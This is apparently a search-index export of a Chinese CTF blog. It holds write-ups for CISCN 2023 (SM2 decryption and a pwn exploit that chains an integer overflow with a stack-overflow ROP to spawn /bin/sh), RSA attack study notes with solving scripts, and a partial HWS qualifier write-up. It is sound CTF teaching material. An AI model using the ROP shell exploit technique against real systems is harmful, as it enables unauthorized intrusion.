<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2023ciscn初赛总结</title>
    <url>/2023/05/28/2023ciscn%E5%88%9D%E8%B5%9B%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p>2023ciscn初赛总结，赛后忘记交wp（</p>
<h2 id="Crypto：国密报告"><a href="#Crypto：国密报告" class="headerlink" title="Crypto：国密报告"></a>Crypto：国密报告</h2><p>发请求拿到唯一id，随后生成密钥对A</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">const sm2 = require(<span class="string">&#x27;sm-crypto&#x27;</span>).sm2</span><br><span class="line"></span><br><span class="line">let keypair = sm2.generateKeyPairHex()</span><br><span class="line"></span><br><span class="line">publicKey = keypair.publicKey // 公钥</span><br><span class="line">privateKey = keypair.privateKey // 私钥</span><br><span class="line"></span><br><span class="line">console.log(publicKey)</span><br><span class="line">console.log(privateKey)</span><br><span class="line"></span><br><span class="line">//044aa510d65be737ac8f2e0a38457915abc65f30e153a66f43e21c4d6b6cf9cbdb99afae316c5e9e217acdd45695da2f39746d9532e799be6e590495130d5c5b82   公钥A</span><br><span class="line">// 824a5860308e9dc6c3bca8848c70ffa80b82a2d30948d8fb0ceb398636a6d84f  私钥A</span><br><span class="line">//1faa445b-<span class="number">2125</span>-4f3c-aaec-d0d6ff9c56ef  <span class="built_in">id</span></span><br></pre></td></tr></table></figure>
<p>发公钥，拿到密文，发id，拿到随机字符串和密钥B</p>
<p><img src="https://s2.loli.net/2023/05/28/x4Hc2659PsYMFCQ.png" alt="wp2.png"></p>
<p>至此有公钥私钥，解密：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmssl <span class="keyword">import</span> sm2</span><br><span class="line"></span><br><span class="line">publicKey=<span class="string">&quot;049d69f37e8bd7803cf6932b70b7823a4d594c94c6b7f9b64afc7773b8cec028d50ff8034653bba346c17fd8afe37164a88e7fc6d2742b328d503b91c460dd3e59&quot;</span></span><br><span class="line">privateKey=<span class="string">&quot;3bfffb52adeafabae695c0df038cf971820fc56de0a797955d7a89a6b5ec7f0b&quot;</span></span><br><span class="line">qs_c=<span class="string">&quot;8140ab618a9ed8b180760cb091f566197ebe920c4507833ef29ed34ac438dc912b49b8f94fe693a96b2e516504ec21b856deda90a86414e345625e1eca0974d8f9c3bb14ed31a11141edc5cd40f1fb6bca8d88e279352be987f86993295433a220c89ba899cc748f3df33ad93dba93c5&quot;</span></span><br><span class="line"></span><br><span class="line">sm2_crypt = sm2.CryptSM2(public_key=spk, private_key=ssk, mode=<span class="number">1</span>)</span><br><span class="line">qs = sm2_crypt.decrypt(<span class="built_in">bytes</span>.fromhex(qs_c))</span><br><span class="line">qs = qs.<span class="built_in">hex</span>().upper()</span><br><span class="line"><span class="built_in">print</span>(qs)</span><br></pre></td></tr></table></figure>
<p>发请求提交，发id查询</p>
<p><img src="https://s2.loli.net/2023/05/28/V2abtfeUnN6Xo9g.png" alt="wp3.png"></p>
<h1 id="Pwn：烧烤摊儿"><a href="#Pwn：烧烤摊儿" class="headerlink" title="Pwn：烧烤摊儿"></a>Pwn：烧烤摊儿</h1><p>点菜菜单存在整数溢出，可以把钱变多，改名环节存在栈溢出，溢出之后构造rop链调用syscall拿到shell，exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./shaokao&#x27;</span>)</span><br><span class="line"><span class="comment"># p=remote(&#x27;123.56.251.120&#x27;,24551)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_rdi=<span class="number">0x40264f</span></span><br><span class="line">pop_rsi=<span class="number">0x40a67e</span></span><br><span class="line">pop_rdx_rbx=<span class="number">0x4a404b</span></span><br><span class="line">pop_rax=<span class="number">0x458827</span></span><br><span class="line">syscall=<span class="number">0x4230a6</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;3. 勇闯天涯\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;4294367398&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi)+p64(<span class="number">0x00000000004E8897</span>)+p64(pop_rdx_rbx)+p64(<span class="number">0x30</span>)+p64(<span class="number">0</span>)+p64(pop_rax)+p64(<span class="number">0</span>)+p64(syscall)+p64(pop_rdi)+p64(<span class="number">0x00000000004E8897</span>)+p64(pop_rsi)+p64(<span class="number">0</span>)+p64(pop_rdx_rbx)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(pop_rax)+p64(<span class="number">0x3b</span>)+p64(syscall)</span><br><span class="line">p.sendline(flat(&#123;<span class="number">0x28</span>:payload&#125;))</span><br><span class="line">p.send(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>希踢爱抚!</category>
      </categories>
      <tags>
        <tag>密码</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>RSA学习</title>
    <url>/2022/11/01/RSA%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h3 id="RSA学习"><a href="#RSA学习" class="headerlink" title="RSA学习"></a>RSA学习</h3><h4 id="了解结构"><a href="#了解结构" class="headerlink" title="了解结构"></a>了解结构</h4><ul>
<li><p>明文m</p>
</li>
<li><p>密文c</p>
</li>
<li><p>公钥e，一个整数，一般情况下是公开的</p>
</li>
<li><p>两个大质数p,q,一般不公开，通过计算n=p*q得到n，此时n的逆向分解很困难，保证加密安全性</p>
</li>
<li><p>私钥d,解密用的钥匙，不公开，但满足条件$e*d mod (p-1)(q-1)=1$ .所以可计算得出,计算代码：</p>
<p>gmpy2.invert(e,(p-1)*(q-1))</p>
</li>
<li><p>加密过程：$c=m^emodn$ 计算代码: c=pow(m,e,n) </p>
</li>
<li><p>解密过程：$m=c^dmod n$ 计算代码：m=pow(c,d,n) </p>
</li>
</ul>
<h4 id="n可以被直接分解"><a href="#n可以被直接分解" class="headerlink" title="n可以被直接分解"></a>n可以被直接分解</h4><p>例题：BUUCTF：[WUSTCTF2020]babyrsa</p>
<p>附件给出c,n,e,此题的n不算太大，因此可以分解n为p,q,然后算出私钥d,即可解出答案</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c = <span class="number">28767758880940662779934612526152562406674613203406706867456395986985664083182</span></span><br><span class="line">n = <span class="number">73069886771625642807435783661014062604264768481735145873508846925735521695159</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p=<span class="number">189239861511125143212536989589123569301</span></span><br><span class="line">q=<span class="number">386123125371923651191219869811293586459</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">d=gmpy2.invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;d=&quot;</span>,d)</span><br><span class="line"></span><br><span class="line">m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>
<h4 id="低加密指数攻击-e很小"><a href="#低加密指数攻击-e很小" class="headerlink" title="低加密指数攻击 (e很小)"></a>低加密指数攻击 (e很小)</h4><p>特征，n很大但e很小</p>
<p>例题：BUUCTF Dangrous RSA</p>
<p>此题n太大了，分解不了，因此换一个思路，由于e 很小，则有条件$c=m^e+kn$ 。这样我们可以爆破这个k的值，让m可以开方，这样可以直接爆破出密文</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n=<span class="number">0x52d483c27cd806550fbe0e37a61af2e7cf5e0efb723dfc81174c918a27627779b21fa3c851e9e94188eaee3d5cd6f752406a43fbecb53e80836ff1e185d3ccd7782ea846c2e91a7b0808986666e0bdadbfb7bdd65670a589a4d2478e9adcafe97c6ee23614bcb2ecc23580f4d2e3cc1ecfec25c50da4bc754dde6c8bfd8d1fc16956c74d8e9196046a01dc9f3024e11461c294f29d7421140732fedacac97b8fe50999117d27943c953f18c4ff4f8c258d839764078d4b6ef6e8591e0ff5563b31a39e6374d0d41c8c46921c25e5904a817ef8e39e5c9b71225a83269693e0b7e3218fc5e5a1e8412ba16e588b3d6ac536dce39fcdfce81eec79979ea6872793</span></span><br><span class="line"></span><br><span class="line">e=<span class="number">3</span></span><br><span class="line"></span><br><span class="line">c=<span class="number">0x10652cdfaa6b63f6d7bd1109da08181e500e5643f5b240a9024bfa84d5f2cac9310562978347bb232d63e7289283871efab83d84ff5a7b64a94a79d34cfbd4ef121723ba1f663e514f83f6f01492b4e13e1bb4296d96ea5a353d3bf2edd2f449c03c4a3e995237985a596908adc741f32365</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># 爆破函数，从k=0开始，逐步爆破，直到m可以被e开方</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">de</span>(<span class="params">c, e, n</span>):</span><br><span class="line">    k = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        m = c - n*k</span><br><span class="line">        result, flag = gmpy2.iroot(m, e) <span class="comment">#判断m开方e是否为整数，如是，则flag=True。</span></span><br><span class="line">        <span class="keyword">if</span> flag == <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        k += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">m=de(c,e,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>
<h4 id="低指数加密广播攻击"><a href="#低指数加密广播攻击" class="headerlink" title="低指数加密广播攻击"></a>低指数加密广播攻击</h4><p>特征:多组n，c，但是使用的是同一个e且e很小</p>
<p>例题：BUUCTF RSA4</p>
<p>多组n,c时考虑将n,c放入数组中，形式为n=[n1,n2,n3]，c=[c1,c2,c3]。然后使用sympy库中的中国剩余定理，这具体是个啥定理我目前也不太理解，但是调用crt(c,n)方法可以得出m的e次方，最后开方即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sympy.ntheory.modular <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n1=<span class="built_in">int</span>(<span class="string">&#x27;331310324212000030020214312244232222400142410423413104441140203003243002104333214202031202212403400220031202142322434104143104244241214204444443323000244130122022422310201104411044030113302323014101331214303223312402430402404413033243132101010422240133122211400434023222214231402403403200012221023341333340042343122302113410210110221233241303024431330001303404020104442443120130000334110042432010203401440404010003442001223042211442001413004&#x27;</span>,<span class="number">5</span>)</span><br><span class="line">c1=<span class="built_in">int</span>(<span class="string">&#x27;310020004234033304244200421414413320341301002123030311202340222410301423440312412440240244110200112141140201224032402232131204213012303204422003300004011434102141321223311243242010014140422411342304322201241112402132203101131221223004022003120002110230023341143201404311340311134230140231412201333333142402423134333211302102413111111424430032440123340034044314223400401224111323000242234420441240411021023100222003123214343030122032301042243&#x27;</span>,<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">n2=<span class="built_in">int</span>(<span class="string">&#x27;302240000040421410144422133334143140011011044322223144412002220243001141141114123223331331304421113021231204322233120121444434210041232214144413244434424302311222143224402302432102242132244032010020113224011121043232143221203424243134044314022212024343100042342002432331144300214212414033414120004344211330224020301223033334324244031204240122301242232011303211220044222411134403012132420311110302442344021122101224411230002203344140143044114&#x27;</span>,<span class="number">5</span>)</span><br><span class="line">c2=<span class="built_in">int</span>(<span class="string">&#x27;112200203404013430330214124004404423210041321043000303233141423344144222343401042200334033203124030011440014210112103234440312134032123400444344144233020130110134042102220302002413321102022414130443041144240310121020100310104334204234412411424420321211112232031121330310333414423433343322024400121200333330432223421433344122023012440013041401423202210124024431040013414313121123433424113113414422043330422002314144111134142044333404112240344&#x27;</span>,<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">n3=<span class="built_in">int</span>(<span class="string">&#x27;332200324410041111434222123043121331442103233332422341041340412034230003314420311333101344231212130200312041044324431141033004333110021013020140020011222012300020041342040004002220210223122111314112124333211132230332124022423141214031303144444134403024420111423244424030030003340213032121303213343020401304243330001314023030121034113334404440421242240113103203013341231330004332040302440011324004130324034323430143102401440130242321424020323&#x27;</span>,<span class="number">5</span>)</span><br><span class="line">c3=<span class="built_in">int</span>(<span class="string">&#x27;10013444120141130322433204124002242224332334011124210012440241402342100410331131441303242011002101323040403311120421304422222200324402244243322422444414043342130111111330022213203030324422101133032212042042243101434342203204121042113212104212423330331134311311114143200011240002111312122234340003403312040401043021433112031334324322123304112340014030132021432101130211241134422413442312013042141212003102211300321404043012124332013240431242&#x27;</span>,<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">e=<span class="number">1</span></span><br><span class="line">n=[n1,n2,n3]</span><br><span class="line">c=[c1,c2,c3]</span><br><span class="line">result,mod=crt(n,c)</span><br><span class="line"><span class="comment">#这里我爆破e的值，如果开方成功则输出答案</span></span><br><span class="line"><span class="keyword">while</span> e&lt;<span class="number">1000</span>:</span><br><span class="line">    value, is_perfect = gmpy2.iroot(result, e)</span><br><span class="line">    <span class="keyword">if</span> is_perfect==<span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span>(long_to_bytes(value))</span><br><span class="line">    e+=<span class="number">1</span></span><br></pre></td></tr></table></figure>
<h4 id="公因数攻击"><a href="#公因数攻击" class="headerlink" title="公因数攻击"></a>公因数攻击</h4><p>特征：很多组n,c</p>
<p>例题：BUUCTF RSA5</p>
<p>题目给出了e和贼多组n，c。因此考虑公因数攻击，当有很多组n时，有可能出现两个n之间存在公因数的情况。又因为n是由指数p*q,因此得到公因数就等于得到了p和q，则题目可解</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n1 = <span class="number">20474918894051778533305262345601880928088284471121823754049725354072477155873778848055073843345820697886641086842612486541250183965966001591342031562953561793332341641334302847996108417466360688139866505179689516589305636902137210185624650854906780037204412206309949199080005576922775773722438863762117750429327585792093447423980002401200613302943834212820909269713876683465817369158585822294675056978970612202885426436071950214538262921077409076160417436699836138801162621314845608796870206834704116707763169847387223307828908570944984416973019427529790029089766264949078038669523465243837675263858062854739083634207</span></span><br><span class="line">c1 = <span class="number">974463908243330865728978769213595400782053398596897741316275722596415018912929508637393850919224969271766388710025195039896961956062895570062146947736340342927974992616678893372744261954172873490878805483241196345881721164078651156067119957816422768524442025688079462656755605982104174001635345874022133045402344010045961111720151990412034477755851802769069309069018738541854130183692204758761427121279982002993939745343695671900015296790637464880337375511536424796890996526681200633086841036320395847725935744757993013352804650575068136129295591306569213300156333650910795946800820067494143364885842896291126137320</span></span><br><span class="line"></span><br><span class="line">...........</span><br><span class="line"><span class="comment">#20组数据就不摆上来了</span></span><br><span class="line"></span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n=[]</span><br><span class="line">c=[]</span><br><span class="line">p=[]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">    n.append(<span class="built_in">eval</span>(<span class="string">&#x27;n&#x27;</span>+<span class="built_in">str</span>(i)))</span><br><span class="line">    c.append(<span class="built_in">eval</span>(<span class="string">&#x27;n&#x27;</span>+<span class="built_in">str</span>(i)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(n)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i+<span class="number">1</span>,<span class="built_in">len</span>(n)):</span><br><span class="line">        <span class="keyword">if</span> gmpy2.gcd(n[i],n[j])!=<span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;i=%d j=%d&quot;</span> %(i,j))</span><br><span class="line">            <span class="built_in">print</span>(gmpy2.gcd(n[i],n[j]))</span><br><span class="line"></span><br><span class="line">p=gmpy2.gcd(n5,n18)</span><br><span class="line">q=n18//p</span><br><span class="line"></span><br><span class="line">d=gmpy2.invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">m=<span class="built_in">pow</span>(c18,d,n18)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>
<h4 id="共模攻击"><a href="#共模攻击" class="headerlink" title="共模攻击"></a>共模攻击</h4><p>特征:多组e，c，共用一个n，且e之间最好互质</p>
<p>例题：BUUCTF [BJDCTF2020]rsa_output</p>
<p>解法：当e1,e2互质时，他们的最大公因数为1，即gcd(e1,e2)=1。根据欧几里得拓展算法，可以得到一个有解的式子：$e1<em>x+e2</em>y=gcd(e1,e2)$ 。得到x,y之后，根据加密过程，化简式子可得:$m=(c1^x*c2^y)modn$。由此得到明文。</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n=<span class="number">21058339337354287847534107544613605305015441090508924094198816691219103399526800112802416383088995253908857460266726925615826895303377801614829364034624475195859997943146305588315939130777450485196290766249612340054354622516207681542973756257677388091926549655162490873849955783768663029138647079874278240867932127196686258800146911620730706734103611833179733264096475286491988063990431085380499075005629807702406676707841324660971173253100956362528346684752959937473852630145893796056675793646430793578265418255919376323796044588559726703858429311784705245069845938316802681575653653770883615525735690306674635167111</span></span><br><span class="line"></span><br><span class="line">e1=<span class="number">3659</span></span><br><span class="line">e2=<span class="number">2767</span></span><br><span class="line"></span><br><span class="line">c1=<span class="number">20152490165522401747723193966902181151098731763998057421967155300933719378216342043730801302534978403741086887969040721959533190058342762057359432663717825826365444996915469039056428416166173920958243044831404924113442512617599426876141184212121677500371236937127571802891321706587610393639446868836987170301813018218408886968263882123084155607494076330256934285171370758586535415136162861138898728910585138378884530819857478609791126971308624318454905992919405355751492789110009313138417265126117273710813843923143381276204802515910527468883224274829962479636527422350190210717694762908096944600267033351813929448599</span></span><br><span class="line">c2=<span class="number">11298697323140988812057735324285908480504721454145796535014418738959035245600679947297874517818928181509081545027056523790022598233918011261011973196386395689371526774785582326121959186195586069851592467637819366624044133661016373360885158956955263645614345881350494012328275215821306955212788282617812686548883151066866149060363482958708364726982908798340182288702101023393839781427386537230459436512613047311585875068008210818996941460156589314135010438362447522428206884944952639826677247819066812706835773107059567082822312300721049827013660418610265189288840247186598145741724084351633508492707755206886202876227</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_,x,y=gmpy2.gcdext(e1,e2)<span class="comment">#拓展欧几里得算法，得到x,y</span></span><br><span class="line"><span class="built_in">print</span>(gcd(e1,e2))<span class="comment">#查看e1,e2是否互质</span></span><br><span class="line"><span class="built_in">print</span>(x,y)</span><br><span class="line">m=<span class="built_in">pow</span>(c1,y,n)*<span class="built_in">pow</span>(c2,x,n)%n<span class="comment">#这里我就理解为x,y是密文解密的私钥了</span></span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="dp泄露"><a href="#dp泄露" class="headerlink" title="dp泄露"></a>dp泄露</h4><p>特征：提供了dp，e，n，c</p>
<p>例题：BUUCTF RSA2</p>
<p>解析：这个题有点抽象，n不够大的情况下可以直接分解为p,q，然后求解私钥就能解了，没用到dp。</p>
<p>当然我们先知道dp是什么，$dp=d\%(p-1)$ 。随后推导可以得到：$e<em>dp=1+k</em>(p-1)$。随后使用爆破求k的方式即可求出p，随后求出q，最后就能得到密钥d。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"> </span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">248254007851526241177721526698901802985832766176221609612258877371620580060433101538328030305219918697643619814200930679612109885533801335348445023751670478437073055544724280684733298051599167660303645183146161497485358633681492129668802402065797789905550489547645118787266601929429724133167768465309665906113</span></span><br><span class="line">dp = <span class="number">905074498052346904643025132879518330691925174573054004621877253318682675055421970943552016695528560364834446303196939207056642927148093290374440210503657</span></span><br><span class="line"> </span><br><span class="line">c = <span class="number">140423670976252696807533673586209400575664282100684119784203527124521188996403826597436883766041879067494280957410201958935737360380801845453829293997433414188838725751796261702622028587211560353362847191060306578510511380965162133472698713063592621028959167072781482562673683090590521214218071160287665180751</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, e):</span><br><span class="line">    <span class="keyword">if</span> (dp * e - <span class="number">1</span>) % i == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> n % (((dp * e - <span class="number">1</span>) // i) + <span class="number">1</span>) == <span class="number">0</span>:</span><br><span class="line">            p = ((dp * e - <span class="number">1</span>) // i) + <span class="number">1</span></span><br><span class="line">            q = n // (((dp * e - <span class="number">1</span>) // i) + <span class="number">1</span>)</span><br><span class="line">            d = gmpy2.invert(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">            m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>
<h4 id="dp-dq泄露"><a href="#dp-dq泄露" class="headerlink" title="dp,dq泄露"></a>dp,dq泄露</h4><p>特征：给出了dp,dq,则不需要e即可得出明文</p>
<p>例题：BUUCTF RSA1</p>
<p>解析：</p>
<p>$m1 = c^{dp}modp$</p>
<p>$m2 = c^{dq}modq$</p>
<p>$m = (((m1-m2)<em>I)\%p)</em>q+m2$</p>
<p>I表示p,q的逆元</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = <span class="number">8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229</span></span><br><span class="line">q = <span class="number">12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469</span></span><br><span class="line"></span><br><span class="line">dp = <span class="number">6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929</span></span><br><span class="line">dq = <span class="number">783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852</span></span><br><span class="line"></span><br><span class="line">i=gmpy2.invert(p,q)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;i=&quot;</span>,i)</span><br><span class="line"></span><br><span class="line">m1=<span class="built_in">pow</span>(c,dp,p)</span><br><span class="line">m2=<span class="built_in">pow</span>(c,dq,q)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m=(((m1-m2)*i)%q)*p+m2</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>希踢爱抚!</category>
      </categories>
      <tags>
        <tag>密码学</tag>
        <tag>基础</tag>
      </tags>
  </entry>
  <entry>
    <title>HWS预选题目总结</title>
    <url>/2023/01/08/HWSa%C2%AE%E9%A2%84%E9%80%89%E9%A2%98%E7%9B%AE%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p>2023HWS预选，折腾完毕了，直接吐了，口区…….</p>
<h2 id="sound-from-somewhere"><a href="#sound-from-somewhere" class="headerlink" title="sound from somewhere"></a>sound from somewhere</h2><p>Misc，题目链接：<a href="https://pan.baidu.com/s/1I79m004ilq8-8FthMcT5NA">https://pan.baidu.com/s/1I79m004ilq8-8FthMcT5NA</a> <strong>提取码：caji</strong></p>
<p>声音内容刺耳，是SSTV慢扫描电视的题，<strong>慢扫描电视(Slow-scan television)</strong>是业余无线电爱好者的一种主要图片传输方法，慢扫描电视通过无线电传输和接收单色或彩色静态图片。所以直接把题目放进SSTV扫一遍就有答案了，工具链接：<a href="https://m0re.lanzoux.com/ibgwKk96pyj">https://m0re.lanzoux.com/ibgwKk96pyj</a>,安装好之后读入扫就行，这里有一个小点就是输入设备改成立体声混音然后播放音频就不需要麦克风输入了。</p>
<p><img src="https://s3.bmp.ovh/imgs/2023/01/08/ea7049a5156344cb.png" alt=""></p>
<p>扫完就出答案了,这里有一个小细节是可以先点扫描再播音乐，他会自动匹配类型</p>
<p><img src="https://s3.bmp.ovh/imgs/2023/01/08/9ae8c46ae31786fc.png" alt=""></p>
<h2 id="Number-Game"><a href="#Number-Game" class="headerlink" title="Number Game"></a>Number Game</h2><p>好像是叫这个名字吧….</p>
<p>题目：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> urandom</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Random</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self._<span class="built_in">id</span> = random.getrandbits(<span class="number">128</span>)</span><br><span class="line">        self._code = random.getrandbits(<span class="number">256</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">id</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">hex</span>(self._<span class="built_in">id</span>)[<span class="number">2</span>:].zfill(<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">code</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">hex</span>(self._code)[<span class="number">2</span>:].zfill(<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># random.seed(urandom(32))</span></span><br><span class="line">random_list=[Random() <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">53</span>)]</span><br><span class="line"><span class="built_in">id</span>=[]</span><br><span class="line">code=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(random_list)):</span><br><span class="line">    <span class="built_in">id</span>.append(random_list[i].<span class="built_in">id</span>)</span><br><span class="line">    code.append(random_list[i].code)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">id</span>)</span><br><span class="line"><span class="built_in">print</span>(code)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;len=&quot;</span>,<span class="built_in">len</span>(code))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag=hashlib.md5((random_list[<span class="number">0</span>].<span class="built_in">id</span>+random_list[<span class="number">0</span>].code).encode()).hexdigest()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag&#123;%s&#125;&#x27;</span> %flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>随机生成128bit的数和256bit的数各53个，但是只给出了后52组，要求求出第一组，emmmmm….真要是随机数那肯定求不出来，可是这玩意不是完全随机，找到一个库直接打，<a href="https://github.com/NonupleBroken/ExtendMT19937Predictor。">https://github.com/NonupleBroken/ExtendMT19937Predictor。</a></p>
<p>然后题目是回溯，找到backtrack部分，开打</p>
